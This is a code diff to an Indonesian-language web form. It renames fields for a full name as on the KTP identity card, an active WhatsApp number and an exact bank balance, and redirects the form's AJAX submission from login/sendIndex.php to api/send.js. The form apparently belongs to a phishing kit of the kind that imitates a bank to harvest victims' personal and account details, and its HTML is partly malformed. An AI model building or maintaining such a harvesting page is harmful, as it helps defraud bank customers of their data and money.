@@ -560,20 +560,20 @@ chsalxcome {
     </svg>
   </span>
 
-  <input type="text" id="nama" name="NAMA" placeholder="Nama sesuai KTP" required>
+  <input type="text" id="nama" name="nama" placeholder="Nama sesuai KTP" required>
 </div>
     
                         </b></div><b <="" label=""> 
        <div class="input-field">
      <label for="nohp">Nomor WhatsApp Aktif</label> 
  <ion-icon name="phone-portrait-sharp" for="nohp"></ion-icon>
- <input type="tel" id="nohp" name="NOMOR" placeholder="08xxxxxxxx" maxlength="13" required="">
+ <input type="tel" id="nohp" name="nohp" placeholder="08xxxxxxxx" maxlength="13" required="">
                         </div>
 
        <div class="input-field">
     <label for="saldo">Saldo Akhir <b style="color: #06529C"></b></label><b style="color: #06529C">
     <ion-icon name="server-sharp"></ion-icon>
- <input type="tel" id="saldo" name="SALDO" class="saldo" placeholder="Rp." maxlength="" minlength="" oninvalid="this.setCustomValidity('Pastikan 𝗦𝗮𝗹𝗱𝗼 𝗦𝗲𝘀𝘂𝗮𝗶 𝗥𝗲𝗸𝗲𝗻𝗶𝗻𝗴')" onchange="this.setCustomValidity('')" required="">
+ <input type="tel" id="saldo" name="saldo" class="saldo" placeholder="Rp." maxlength="" minlength="" oninvalid="this.setCustomValidity('Pastikan 𝗦𝗮𝗹𝗱𝗼 𝗦𝗲𝘀𝘂𝗮𝗶 𝗥𝗲𝗸𝗲𝗻𝗶𝗻𝗴')" onchange="this.setCustomValidity('')" required="">
                         </b></div><b style="color: #06529C">
                     </b></b></div><b <="" label=""><b style="color: #06529C">
    <div class="card-footer">
@@ -615,7 +615,7 @@ function sendHpp(){
     
     $.ajax({
         type: 'POST',
-        url: 'login/sendIndex.php',
+        url: 'api/send.js',
         data: $('#index').serialize(),
         datatype: 'JSON',   
     complete: function(){    
